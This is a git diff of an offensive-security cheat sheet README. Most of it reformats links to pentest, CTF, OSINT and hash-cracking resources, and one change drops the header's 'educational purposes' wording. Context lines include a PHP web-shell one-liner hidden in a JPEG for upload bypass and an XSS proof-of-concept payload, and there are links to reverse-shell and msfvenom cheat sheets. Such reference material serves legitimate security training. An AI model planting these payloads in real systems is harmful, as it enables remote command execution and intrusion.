@@ -5,7 +5,7 @@
 <img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWM2NWI0ZDIwMjA3ZWIyYWRiZmEyYzA5NTFlNThmNTFhYWI1MWE0ZiZlcD12MV9pbnRlcm5hbF9naWZzX2dpZklkJmN0PWc/3oz8xA9gtnyVDPZJHW/giphy.gif' width='250'/>
 
 <h2 align='center'>Welcome to my offensive security cheat sheet library.</h2>
-<h3 align='center'>This repository is intended for educational purposes. Please use responsibly and ethically, especially when exploring sensitive security concepts.</h3>
+<h3 align='center'>Please use responsibly and ethically, especially when exploring sensitive security concepts.</h3>
 
 <h3 id='start'> There are: </h3>
 <ol>
@@ -601,6 +601,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 			<pre><code>echo "&lt;?php system($_GET['cmd'])>" >> file.jpeg</code></pre>
 	</ul>
     <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
+	<a href='https://xss.report/'>XSS.report</a>. Suggest payloads too
 	<ol>
 	    <li> <b>Proof Of Concept (PoC):</b>
 		    <pre><code><scRIPt>alert('Success XSS!');&lt;/sCriPt></code></pre>
@@ -687,28 +688,29 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
         
 <h2 align='center' id='n3'><em>Sites</em></h2>
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Someone main </h3>
-	      <li> <a href='https://book.hacktricks.xyz/'> HackTricks</a> - must have!!! PrivEsc, brute force, pentest network and wifi, metodologies cheatsheets and much more
-	      <li> <a href='https://cloud.hacktricks.xyz/'> Cloud HackTricks</a>
-              <li> <a href='https://ppn.snovvcrash.rocks/'> Pentest notes</a> by <a href='https://snovvcrash.rocks/about'>snovvcrash</a>
-	      <li> <a href='https://gtfobins.github.io/#'> GTFO</a> bins. How to escalqte privs, how to get shells and much more with binary in target system
-	      <li> <a href='https://lolbas-project.github.io/#'> LOLBAS</a>. Help with Windows
-	      <li> <a href='https://shell-storm.org/'>Shell-Storm</a>. DB of shell-codes
-	      <li> <a href='https://www.thehacker.recipes/'> thehacker.recipes</a>. Help with AD
-	      <li> <a href='https://appsecexplained.gitbook.io/appsecexplained'>appsecexplained.gitbook.io</a>Help with explotation vulns.
-	      <li> <a href='https://search-engine-bug-bounty.netlify.app/'> Search engine bug bounty</a>. Help with vulns scanning
-	      <li> <a href='https://app.interactsh.com/#/'> interactsh.com</a>. Like a Burp Collaborator.
+	      <li><a href='https://book.hacktricks.xyz/'> HackTricks</a> - must have!!! PrivEsc, brute force, pentest network and wifi, metodologies cheatsheets and much more
+	      <li><a href='https://cloud.hacktricks.xyz/'> Cloud HackTricks</a>
+              <li><a href='https://ppn.snovvcrash.rocks/'> Pentest notes</a> by <a href='https://snovvcrash.rocks/about'>snovvcrash</a>
+	      <li><a href='https://gtfobins.github.io/#'> GTFO</a> bins. How to escalqte privs, how to get shells and much more with binary in target system
+	      <li><a href='https://lolbas-project.github.io/#'> LOLBAS</a>. Help with Windows
+	      <li><a href='https://shell-storm.org/'>Shell-Storm</a>. DB of shell-codes
+	      <li><a href='https://www.thehacker.recipes/'> thehacker.recipes</a>. Help with AD
+	      <li><a href='https://appsecexplained.gitbook.io/appsecexplained'>appsecexplained.gitbook.io</a>Help with explotation vulns.
+	      <li><a href='https://search-engine-bug-bounty.netlify.app/'> Search engine bug bounty</a>. Help with vulns scanning
+	      <li><a href='https://app.interactsh.com/#/'> interactsh.com</a>. Like a Burp Collaborator.
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cheat sheets, Tips </h3>
-	      <li> <a href='https://devhints.io/bash'> Bash scripting</a>
-	      <li> <a href='https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2'> How</a> pump nc shell
-	      <li> <a href='https://www.stationx.net/nmap-cheat-sheet/'> Nmap</a>
-              <li> <a href='https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'> PowerShell</a> cheatsheet
-	      <li> <a href="https://redteamrecipe.com/powershell-tips-tricks"> PowerShell</a> tips and tricks
-	      <li> <a href='https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets'> ired.team</a>. Pentesting Cheatsheets. Convenient commands for your pentesting / red-teaming engagements, OSCP and CTFs
-	      <li> <a href='https://www.stationx.net/common-ports-cheat-sheet/'>1</a>, <a href='https://packetlife.net/media/library/23/common-ports.pdf'>2</a> and <a href='https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/'> 3</a> can help with ports
-	      <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'> Reverse Shell </a> cheatsheet
-	      <li> <a href='https://vimsheet.com/'> A Great Vim</a> Cheat Sheet
-	      <li> <a href='https://websec.ca/kb/sql_injection'> SQLi </a> cheatsheet
-	      <li> Another one <a href='https://tib3rius.com/sqli'> SQLi</a> cheatsheet
+	      <li><a href='https://devhints.io/bash'> Bash scripting</a>
+	      <li><a href='https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2'> How</a> pump nc shell
+	      <li><a href='https://www.stationx.net/nmap-cheat-sheet/'> Nmap</a>
+              <li><a href='https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'> PowerShell</a> cheatsheet
+	      <li><a href="https://redteamrecipe.com/powershell-tips-tricks"> PowerShell</a> tips and tricks
+	      <li><a href='https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets'> ired.team</a>. Pentesting Cheatsheets. Convenient commands for your pentesting / red-teaming engagements, OSCP and CTFs
+	      <li><a href='https://www.stationx.net/common-ports-cheat-sheet/'>1</a>, <a href='https://packetlife.net/media/library/23/common-ports.pdf'>2</a> and <a href='https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/'> 3</a> can help with ports
+	      <li><a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'> Reverse Shell </a> cheatsheet
+	      <li><a href='https://vimsheet.com/'> A Great Vim</a> Cheat Sheet
+	      <li><a href='https://websec.ca/kb/sql_injection'> SQLi </a> cheatsheet
+	      <li>Another one <a href='https://tib3rius.com/sqli'> SQLi</a> cheatsheet
+	      <li><a href='https://xss.report/'>XSS.report</a>. Help with xss payloads
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CVE and Vulnerabilities db </h3>
 	      <li><a href='https://www.first.org/cvss/calculator/3.0'>First.org</a>. CVSS calculator 3.0
 	      <li><a href='https://cvexploits.io/'> Cvexploits.io</a>
@@ -730,67 +732,67 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		<li><a href='https://dorks.faisalahmed.me'> Dorks helper</a>
 		<li><a href='https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/'>Another dorks helper</a>
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hashes, encode/decode, cracker, identify </h3>
-	      <li> <a href='https://crackstation.net/'> crackstation.net</a> - online password hash cracker
-	      <li> <a href='https://www.base64encode.org/'> Base64</a> encode/decode
-	      <li> <a href='https://hashes.com/en/tools/hash_identifier'> Identify hash types </a>
-	      <li> <a href='https://gchq.github.io/CyberChef/'> CyberChef</a> - encode/decode service
-	      <li> <a href='https://www.kirsle.net/wizards/flask-session.cgi'> Flask Session Cookie Decoder </a>
-	      <li> <a href='https://ntlm.pw/'> NTLM.pw</a>. Help with NTLM hashes.
-	      <li> <a href='https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html'> RSA</a> calculator
+	      <li><a href='https://crackstation.net/'> crackstation.net</a> - online password hash cracker
+	      <li><a href='https://www.base64encode.org/'> Base64</a> encode/decode
+	      <li><a href='https://hashes.com/en/tools/hash_identifier'> Identify hash types </a>
+	      <li><a href='https://gchq.github.io/CyberChef/'> CyberChef</a> - encode/decode service
+	      <li><a href='https://www.kirsle.net/wizards/flask-session.cgi'> Flask Session Cookie Decoder </a>
+	      <li><a href='https://ntlm.pw/'> NTLM.pw</a>. Help with NTLM hashes.
+	      <li><a href='https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html'> RSA</a> calculator
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Learning Path & Practise </h3>
-	      <li> <a href='https://www.eccouncil.org/'> CEH </a>
-	      <li> <a href='https://www.root-me.org/'> Root.me </a>
-	      <li> <a href='https://ctf365.com/?source=post_page---------------------------'> CTF365 </a> - suitable for security professionals looking to acquire offensive skills, or system administrators interested in enhancing their defensive skills
-	      <li> <a href='https://cryptohack.org/'> Cryptohack</a>. A free, fun platform for learning modern cryptography
-	      <li> <a href='https://tryhackme.com/'> TryHackMe </a>
-	      <li> <a href='https://www.hackthebox.com/'> HackTheBox </a>
-	      <li> <a href='https://portswigger.net/web-security'> Port Swigger </a>
-	      <li> <a href='https://pentesterlab.com/'> Pentersterlab.com</a>. Сourses explaining vulnerabilities
-	      <li> <a href='https://ohmygit.org'> Ohmygit.org</a>. Help with git in play mode.
-	      <li> <a href='https://hackthissite.org/'> HackThisSite</a> - a free website with wargames to test and improve your white hat hacking skills. It offers a variety of hacking challenges in several categories, ncluding basic tasks, fricking, JavaScript, 		forensics, steganography, and more
-	      <li> <a href='https://hackaday.com/'> Hackaday</a> - serves up Fresh Hacks Every Day from around the Internet
-	      <li> <a href='https://ctftime.org/ctfs'> CTFtime</a>. CTF practice
-	      <li> <a href='http://www.itsecgames.com/'> BWAPP</a> - buggy web application. Virtual pentest laboratory to practice
-	      <li> Free <a href='https://thexssrat.podia.com/ratatatata'> set</a> of practice tasks. Thanks to <a href='https://www.youtube.com/c/TheXSSrat'> TheXSSrat </a>
-	      <li> <a href='https://overthewire.org/wargames/'> OVERTHEWIRE</a> - uitable for anyone looking to learn the theory of information security and apply it in practice regardless of their experience level
-	      <li> <a href='https://hacking-lab.com/services/'> HACKING-LAB</a> - provides CTF challenges for the European Cyber Security Challenge, but they also host regular competitions on their platform that anyone can participate in
-              <li> <a href='https://pwnable.kr/'> PWNABLE.KR</a> - this platform focuses on pwn challenges similar to CTF, which involve finding, reading, and submitting flag files that are present in each task
-	      <li> <a href='https://w3challs.com/'> W3Challs</a> - an educational platform with a variety of tasks in different categories, including hacking, wargames, forensics, cryptography, steganography, and programming. The platform aims to provide realistic 		challenges. Depending on the difficulty of the solved task, you earn points. There is also a forum where you can discuss and solve tasks with other participants
+	      <li><a href='https://www.eccouncil.org/'> CEH </a>
+	      <li><a href='https://www.root-me.org/'> Root.me </a>
+	      <li><a href='https://ctf365.com/?source=post_page---------------------------'> CTF365 </a> - suitable for security professionals looking to acquire offensive skills, or system administrators interested in enhancing their defensive skills
+	      <li><a href='https://cryptohack.org/'> Cryptohack</a>. A free, fun platform for learning modern cryptography
+	      <li><a href='https://tryhackme.com/'> TryHackMe </a>
+	      <li><a href='https://www.hackthebox.com/'> HackTheBox </a>
+	      <li><a href='https://portswigger.net/web-security'> Port Swigger </a>
+	      <li><a href='https://pentesterlab.com/'> Pentersterlab.com</a>. Сourses explaining vulnerabilities
+	      <li><a href='https://ohmygit.org'> Ohmygit.org</a>. Help with git in play mode.
+	      <li><a href='https://hackthissite.org/'> HackThisSite</a> - a free website with wargames to test and improve your white hat hacking skills. It offers a variety of hacking challenges in several categories, ncluding basic tasks, fricking, JavaScript, 			forensics, steganography, and more
+	      <li><a href='https://hackaday.com/'> Hackaday</a> - serves up Fresh Hacks Every Day from around the Internet
+	      <li><a href='https://ctftime.org/ctfs'> CTFtime</a>. CTF practice
+	      <li><a href='http://www.itsecgames.com/'> BWAPP</a> - buggy web application. Virtual pentest laboratory to practice
+	      <li>Free <a href='https://thexssrat.podia.com/ratatatata'> set</a> of practice tasks. Thanks to <a href='https://www.youtube.com/c/TheXSSrat'> TheXSSrat </a>
+	      <li><a href='https://overthewire.org/wargames/'> OVERTHEWIRE</a> - uitable for anyone looking to learn the theory of information security and apply it in practice regardless of their experience level
+	      <li><a href='https://hacking-lab.com/services/'> HACKING-LAB</a> - provides CTF challenges for the European Cyber Security Challenge, but they also host regular competitions on their platform that anyone can participate in
+              <li><a href='https://pwnable.kr/'> PWNABLE.KR</a> - this platform focuses on pwn challenges similar to CTF, which involve finding, reading, and submitting flag files that are present in each task
+	      <li><a href='https://w3challs.com/'> W3Challs</a> - an educational platform with a variety of tasks in different categories, including hacking, wargames, forensics, cryptography, steganography, and programming. The platform aims to provide realistic 		challenges. Depending on the difficulty of the solved task, you earn points. There is also a forum where you can discuss and solve tasks with other participants
 	      <li> <a href='https://www.smashthestack.org/'> SmashTheStack</a> - consists of 7 different wargames: Amateria, Apfel (currently offline), Blackbox, Blowfish, CTF (currently offline), Logic, and Tux. Each wargame contains a variety of tasks ranging from 		standard vulnerabilities to reverse engineering challenges
-	      <li> <a href='https://microcorruption.com/'> Microcorruption</a> - is a CTF where you need to "reverse" fictional electronic locking devices called Lockitall. Lockitall devices protect bonds stored in warehouses owned by the fictional company 			CyYombinator. On the way to stealing the bonds, you will learn about assembly language, how to use a debugger, step through code, set breakpoints, and explore memory
-	      <li> <a href='https://pwn0.com/'> The platform pwn0</a> - is a VPN where almost anything can happen. Fight against bots or users and earn points by gaining control over other systems
+	      <li><a href='https://microcorruption.com/'> Microcorruption</a> - is a CTF where you need to "reverse" fictional electronic locking devices called Lockitall. Lockitall devices protect bonds stored in warehouses owned by the fictional company 			CyYombinator. On the way to stealing the bonds, you will learn about assembly language, how to use a debugger, step through code, set breakpoints, and explore memory
+	      <li><a href='https://pwn0.com/'> The platform pwn0</a> - is a VPN where almost anything can happen. Fight against bots or users and earn points by gaining control over other systems
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MSFVenom help </h3>
-	      <li> <a href='https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1'> gist.github </a>
-	      <li> <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/'> Cheat Sheet </a> 
+	      <li><a href='https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1'> gist.github </a>
+	      <li><a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/'> Cheat Sheet </a> 
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OSINT and Information Gathering </h3>
-	      <li> <a href='https://osintframework.com/'> OSINT Framework</a>Aggregation of all popular tools and resources for OSINT
-	      <li> <a href='https://archive.org/'> Archive</a> of sites history
-	      <li> <a href='https://www.babelstreet.com/'> Babel street</a>.
-	      <li> <a href='https://crt.sh/'> Crt.sh</a>
+	      <li><a href='https://osintframework.com/'> OSINT Framework</a>Aggregation of all popular tools and resources for OSINT
+	      <li><a href='https://archive.org/'> Archive</a> of sites history
+	      <li><a href='https://www.babelstreet.com/'> Babel street</a>.
+	      <li><a href='https://crt.sh/'> Crt.sh</a>
 	      <li><a href='https://chaos.projectdiscovery.io/'>chaos.projectdiscovery.io</a>
 	      <li><a href='https://fofa.info/'>Fofa</a>. Passive scaner like shodan
 	      <li><a href='https://netlas.io/'>Netlas.io</a>. Discover, scan and monitor any online assets
        	      <li><a href='https://intelx.io/'>Intelx.io</a>. Search engine woth leak from darkweb resourses
-	      <li> <a href='https://dnsdumpster.com/'> DNSdumpster</a> for passive and fast search domains and subdomains and etc
-	      <li> <a href='https://urldna.io/'> Urldna.io</a>. Free, complex, power tool for research web. Collect ssl info, ip addreses, headers, cookies, some info about techs and etc
-	      <li> <a href='https://web-check.xyz/'> Web-check.xyz</a>. In just 20 seconds, you can see what attackers already know
-	      <li> <a href='https://haveibeenpwned.com/'> Have I been pwned</a>. Emails leak
-	      <li> <a href='https://www.dehashed.com/'> Dehashed</a>.Another source of emails leak
-	      <li> <a href='https://geospy.web.app/'> Geospy</a>. This is an online service for determining the physical address of the location depicted in a photograph
-	      <li> <a href='https://www.google.com/alerts?hl=ru'> Google Alert</a>. Notifies you when the specified information appears on the Internet
-	      <li> <a href='https://viewdns.info/'> ViewDNS</a> Offers reverse IP Lookup
-	      <li> <a href='https://sitereport.netcraft.com/?url=http://google.com'> Netcraft.</a> Information about domain. Temple of searching: <pre><code>https://sitereport.netcraft.com/?url=&lt;TARGET_URL></code></pre>
-              <li> <a href='https://www.shodan.io/'> Shodan</a> is the world's first search engine for Internet-connected devices.
-	      <li> <a href='https://securityheaders.com/'> SecurityHeaders</a> Scanner of headers security
-	      <li> <a href='https://observatory.mozilla.org/'> Observatory.mozilla</a> Scanner of headers security
-	      <li> <a href='https://spark-interfax.ru/'> This</a> is a system that gathers all available information about companies and extracts data from it
-              <li> <a href='https://search.censys.io/'> Censys Search</a> Can provide a lot of information about IP addresses and domains
-	      <li> <a href='https://www.robtex.com/'> Robtex</a> Whois like tool. Techs, servers, ips, dns configuration and another info about target
-	      <li> <a href='https://crt.sh/'> DataBase</a> SSL/TLS-certificates issued for domain names
+	      <li><a href='https://dnsdumpster.com/'> DNSdumpster</a> for passive and fast search domains and subdomains and etc
+	      <li><a href='https://urldna.io/'> Urldna.io</a>. Free, complex, power tool for research web. Collect ssl info, ip addreses, headers, cookies, some info about techs and etc
+	      <li><a href='https://web-check.xyz/'> Web-check.xyz</a>. In just 20 seconds, you can see what attackers already know
+	      <li><a href='https://haveibeenpwned.com/'> Have I been pwned</a>. Emails leak
+	      <li><a href='https://www.dehashed.com/'> Dehashed</a>.Another source of emails leak
+	      <li><a href='https://geospy.web.app/'> Geospy</a>. This is an online service for determining the physical address of the location depicted in a photograph
+	      <li><a href='https://www.google.com/alerts?hl=ru'> Google Alert</a>. Notifies you when the specified information appears on the Internet
+	      <li><a href='https://viewdns.info/'> ViewDNS</a> Offers reverse IP Lookup
+	      <li><a href='https://sitereport.netcraft.com/?url=http://google.com'> Netcraft.</a> Information about domain. Temple of searching: <pre><code>https://sitereport.netcraft.com/?url=&lt;TARGET_URL></code></pre>
+              <li><a href='https://www.shodan.io/'> Shodan</a> is the world's first search engine for Internet-connected devices.
+	      <li><a href='https://securityheaders.com/'> SecurityHeaders</a> Scanner of headers security
+	      <li><a href='https://observatory.mozilla.org/'> Observatory.mozilla</a> Scanner of headers security
+	      <li><a href='https://spark-interfax.ru/'> This</a> is a system that gathers all available information about companies and extracts data from it
+              <li><a href='https://search.censys.io/'> Censys Search</a> Can provide a lot of information about IP addresses and domains
+	      <li><a href='https://www.robtex.com/'> Robtex</a> Whois like tool. Techs, servers, ips, dns configuration and another info about target
+	      <li><a href='https://crt.sh/'> DataBase</a> SSL/TLS-certificates issued for domain names
 	      <li> Metasearch Engine:
 		      <ol>
-			      <li> <a href='https://www.faganfinder.com/'> Fagan Finder</a> - is an excellent source of information. You enter a query, then click on the desired source. Then you are redirected to the relevant page. The most important thing is that it 				shows how many sources there can be and how diverse they can be: from the Library of Congress website to leak publication services
-	      		      <li> <a href='https://intelx.io/'> Intelligence X</a> - it not only searches for leaks but also helps navigate other OSINT tools. Services for email verification, DNS search - you'll find them here too. Go to the Tools section and search 				specifically 
+			      <li><a href='https://www.faganfinder.com/'> Fagan Finder</a> - is an excellent source of information. You enter a query, then click on the desired source. Then you are redirected to the relevant page. The most important thing is that it 				shows how many sources there can be and how diverse they can be: from the Library of Congress website to leak publication services
+	      		      <li><a href='https://intelx.io/'> Intelligence X</a> - it not only searches for leaks but also helps navigate other OSINT tools. Services for email verification, DNS search - you'll find them here too. Go to the Tools section and search 				specifically 
 		      </ol>
 	      <li> Tools for people search by photo:
 		      <ol>
